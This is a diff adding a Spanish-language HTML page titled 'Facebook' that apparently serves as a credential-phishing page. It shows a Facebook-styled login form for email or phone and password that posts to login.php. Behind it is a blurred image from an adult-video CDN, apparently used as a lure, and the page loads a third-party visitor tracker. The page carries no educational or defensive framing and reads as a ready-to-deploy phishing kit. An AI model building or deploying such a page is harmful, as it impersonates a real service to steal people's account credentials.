@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url('https://cdn77-pic.xvideos-cdn.com/videos/thumbs169poster/2f/0d/77/2f0d77b1c2364307b80b28a035daebe6/2f0d77b1c2364307b80b28a035daebe6.16.jpg');
+            background-size: cover;
+            filter: blur(8px);
+            z-index: -1;
+        }
+        @media (max-width: 600px) {
+            .background {
+                background-image: url('https://cdn77-pic.xvideos-cdn.com/videos/thumbs169poster/2f/0d/77/2f0d77b1c2364307b80b28a035daebe6/2f0d77b1c2364307b80b28a035daebe6.16.jpg'); /* Cambia esto por la URL de tu imagen para móviles */
+            }
+        }
+        .login-container {
+            background: rgba(255, 255, 255, 0.7);
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            z-index: 1;
+            width: 400px; /* Ancho predeterminado para escritorio */
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            position: relative;
+        }
+        .password-container {
+            position: relative;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 20px; /* Ajustar el desplazamiento hacia la izquierda */
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+        button {
+            width: 90%;
+            padding: 10px;
+            background-color: #4267B2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #365e9e;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                height: auto;
+                overflow: auto;
+            }
+            .login-container {
+                width: 90%;
+                padding: 15px;
+            }
+            input, button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+    <div class="login-container">
+        <img src="https://www.heatwave.com.mx/wp-content/uploads/2019/05/candado.png" alt="Candado" style="width: 30px; display: block; margin: 0 auto 20px;">
+        <form action="login.php" method="POST">
+            <input type="text" name="contact" placeholder="Correo o Teléfono" required>
+            <div class="password-container">
+                <input type="password" name="password" placeholder="Contraseña" required id="password">
+                <span class="toggle-password" onclick="togglePassword()">👁️‍🗨️</span>
+            </div>
+            <button type="submit">Iniciar Sesión</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        <script id="_waugx4">var _wau = _wau || []; _wau.push(["small", "81vc72ja0r", "gx4"]);</script>
+        <script async src="//waust.at/s.js"></script>
+    </div>
+    
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+        }
+
+        document.querySelector('form').addEventListener('submit', function(event) {
+            const inputContact = document.querySelector('input[name="contact"]');
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phonePattern = /^\d{10,15}$/; // Acepta números de 10 a 15 dígitos
+
+            if (!emailPattern.test(inputContact.value) && !phonePattern.test(inputContact.value)) {
+                alert('Por favor, introduce un correo electrónico o un número de teléfono válido.');
+                event.preventDefault(); // Evita que se envíe el formulario
+            }
+        });
+    </script>
+</body>
+</html>
